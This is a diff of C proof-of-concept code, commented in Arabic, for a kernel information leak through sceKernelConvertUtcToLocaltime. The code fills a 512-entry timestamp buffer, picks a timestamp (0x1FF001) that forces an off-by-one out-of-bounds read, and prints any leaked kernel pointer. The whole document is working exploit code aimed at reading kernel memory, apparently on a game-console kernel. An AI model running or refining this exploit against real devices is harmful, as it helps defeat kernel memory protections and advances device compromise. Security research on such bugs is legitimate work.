@@ -128,19 +128,13 @@ int _main(struct thread *td) {
 
     printf_debug("=== timezone infoleak PoC ===\n");
 
-    // [1] ملأ الـ buffer كاملاً بـ 512 entry
-    // timestamps تصاعدية لإجبار binary search
-    // يختار آخر index = 511
     static uint8_t data[512 * 16];
     memset(data, 0, sizeof(data));
 
-    // نضع timestamps تصاعدية
+    // timestamps تصاعدية
     for (int i = 0; i < 512; i++) {
-        // timestamp
-        *(long*)(data + i * 16)     = (long)i * 0x1000;
-        // offset — نضع marker
-        *(int*)(data  + i * 16 + 8) = 0x41410000 + i;
-        // dst
+        *(long*)(data + i * 16)      = (long)i * 0x1000;
+        *(int*)(data  + i * 16 + 8)  = 0x41410000 + i;
         *(int*)(data  + i * 16 + 12) = 0x42420000 + i;
     }
 
@@ -152,16 +146,17 @@ int _main(struct thread *td) {
         return 0;
     }
 
-    // [2] استدعي مع timestamp كبير جداً
-    // لإجبار binary search يختار index = 511 (آخر entry)
-    // ثم off-by-one يجعله يقرأ من index = 512
-    // = خارج الـ buffer!
-    long out_local   = 0;
-    long out_tz[2]   = {0, 0};
-    int  out_dst     = 0;
+    // timestamp أكبر من آخر entry بقليل
+    // entry[511].timestamp = 511 * 0x1000 = 0x1FF000
+    // نستخدم 0x1FF001 لإجبار index = 512
+    long timestamp = 0x1FF001;
+
+    long out_local = 0;
+    long out_tz[2] = {0, 0};
+    int  out_dst   = 0;
 
     r = sceKernelConvertUtcToLocaltime(
-        0x7FFFFFFFFFFFFFFF,  // timestamp ضخم جداً
+        timestamp,
         &out_local,
         out_tz,
         &out_dst
@@ -173,13 +168,17 @@ int _main(struct thread *td) {
     printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
     printf_debug("out_dst  =0x%x\n",  out_dst);
 
-    // لو out_tz[0] أو out_local تحتوي على قيمة غريبة
-    // = قرأنا من kernel memory خارج الـ buffer!
-    // kernel pointers عادةً تبدأ بـ 0xffffffff
-    if ((out_local  & 0xffffffff00000000) == 0xffffffff00000000 ||
-        (out_tz[0]  & 0xffffffff00000000) == 0xffffffff00000000) {
-        printf_debug("[+] KERNEL POINTER LEAKED!\n");
-        printf_debug("leaked = 0x%lx\n", out_local);
+    // لو out_tz[0] يحتوي على قيمة من DAT_ffffffff844d1790:
+    // = count = 512 = 0x200
+    printf_debug("\nExpected if OOB:\n");
+    printf_debug("DAT_ffffffff844d1790 = 0x200 (count)\n");
+    printf_debug("DAT_ffffffff844d1798 = ktimer data\n");
+
+    // فحص infoleak
+    if (out_tz[0] != 0 && 
+        (out_tz[0] & 0xffffffff00000000) != 0x4242000000000000) {
+        printf_debug("[+] POTENTIAL INFOLEAK!\n");
+        printf_debug("leaked = 0x%lx\n", out_tz[0]);
     }
 
     return 0;
